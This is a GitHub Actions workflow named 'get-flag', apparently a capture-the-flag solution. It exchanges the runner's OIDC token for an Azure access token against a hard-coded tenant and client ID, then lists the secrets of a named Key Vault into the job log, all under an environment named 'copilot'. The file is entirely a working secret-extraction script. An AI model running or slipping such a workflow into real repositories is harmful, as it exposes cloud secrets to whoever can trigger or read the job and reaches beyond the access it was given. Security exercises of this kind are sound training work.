 name: get-flag
    on: [workflow_dispatch]

    permissions:
      id-token: write
      contents: read

    jobs:
      get-flag:
        runs-on: ubuntu-latest
        environment: copilot
        steps:
          - name: Get flag from Key Vault
            run: |
              OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')

              AZ_TOKEN=$(curl -s -X POST \
                "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
                -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&grant_type=urn:ietf:params:oauth:grant-type:jwt-
  bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC_TOKEN&scope=https://vault.azure.
  net/.default" \
                | jq -r '.access_token')

              echo "=== List secrets in kv-tbl-sec ==="
              curl -s -H "Authorization: Bearer $AZ_TOKEN" \
                "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4"
